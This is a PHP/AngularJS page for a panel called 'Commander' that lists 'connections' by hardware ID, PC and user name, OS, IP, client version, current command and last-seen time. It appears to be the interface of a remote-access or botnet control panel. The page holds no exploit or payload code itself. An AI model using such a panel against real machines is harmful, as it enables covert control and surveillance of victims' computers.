<?php 
require_once("auth.php"); 
checkLoggedIn();
?>
<!DOCTYPE html>
<html ng-app="commander">
<head>
	<meta charset="utf-8">
	<title>Commander - Home</title>
	<?php require_once("header.php"); ?>
	<script src="assets/app.js"></script>
	<script src="assets/controllers.js"></script>
</head>
<body>
	<div class="navbar navbar-inverse navbar-fixed-top">
		<div class="navbar-inner">
			<div class="container">
			<button type="button" class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
			<span class="icon-bar"></span>
			<span class="icon-bar"></span>
			<span class="icon-bar"></span>
			</button>
			<a class="brand" href="#">Commander</a>
				<div class="nav-collapse collapse">
				<ul class="nav">
					<li class="active"><a href="#">Home</a></li>
					<li class="dropdown open">
						<a href="#" class="dropdown-toggle" data-toggle="dropdown">Connections<b class="caret"></b></a>
						<ul class="dropdown-menu">
						<li><a href="#">List View</a></li>
						<li><a href="#">Thumbnail View</a></li>
						</ul>
					</li>
					<li><a href="#contact">Contact</a></li>
				</ul>
				</div><!--/.nav-collapse -->
				<div class="btn-group pull-right">
					<a class="btn dropdown-toggle" data-toggle="dropdown" href="#">
						<i class="icon-user"></i> <?php echo CP_USERNAME; ?> <span class="caret"></span>
					</a>
					<ul class="dropdown-menu">
						<li><a href="#"><i class="icon-wrench"></i> Settings</a></li>
						<li class="divider"></li>
						<li><a href="login.php?logout=true"><i class="icon-share"></i> Logout</a></li>
					</ul>
				</div>
			</div>
		</div>
	</div>

	<div class="container"> <!--ng-view-->
		<h1>Connections</h1>
		<fieldset class="well">
			<div class="btn-toolbar">
				<!-- <button class="btn btn-primary">New User</button>
				<button class="btn">Import</button>
				<button class="btn">Export</button> -->
				<span class="badge badge-success">{{onlineCount}} Online</span>
				<span class="badge">{{allCount}} Total</span>
				<div class="pull-right">
					<div class="input-append "><input type="text" ng-model="filter"><span class="add-on"><i class="icon-search"></i></span></div>
				</div>
			</div>
			<table class="table table-striped table-condensed" ng-controller="AllCtrl">
			<thead>
				<tr>
					<th><input type="checkbox" class="checkall"></th>
					<th ng-click="sortBy('hwid')" onselectstart='return false;'>HWID</th>
					<th ng-click="sortBy('pcname')" onselectstart='return false;'>Name</th>
					<th ng-click="sortBy('os')" onselectstart='return false;'>OS</th>
					<th ng-click="sortBy('ip')" onselectstart='return false;'>IP</th>
					<th ng-click="sortBy('version')" onselectstart='return false;'>Version</th>
					<th ng-click="sortBy('current_command')" onselectstart='return false;'>Command</th>
					<th ng-click="sortBy('last_seen')" onselectstart='return false;'>Last Seen</th>
					<th>Options</th>
				</tr>
			</thead>
			<tbody>
				<tr ng-repeat="connection in connections | filter:filter | orderBy:sort">
					<td><input type="checkbox" name="select" value={{connection.id}}></td>
					<td>{{connection.hwid}}</td>
					<td>{{connection.pcname}}\{{connection.username}}</td>
					<td>{{connection.os}}</td>
					<td>{{connection.ip}}</td>
					<td>{{connection.version}}</td>
					<td><span class="label label-{{connection.command_seen}}">{{connection.current_command}}</span></td>
					<td><span class="label label-success">{{connection.last_seen}}</span></td>
					<td><a popover hwid="connection.hwid"><i class="icon-picture"></i></a> <a href="#"><i class="icon-pencil"></i></a> <a href="#"><i class="icon-wrench"></i></a></td>
				</tr>
			</tbody>
			</table>
		</fieldset>
	</div> <!-- /container -->

	<?php require_once("footer.php"); ?>
</body>
</html>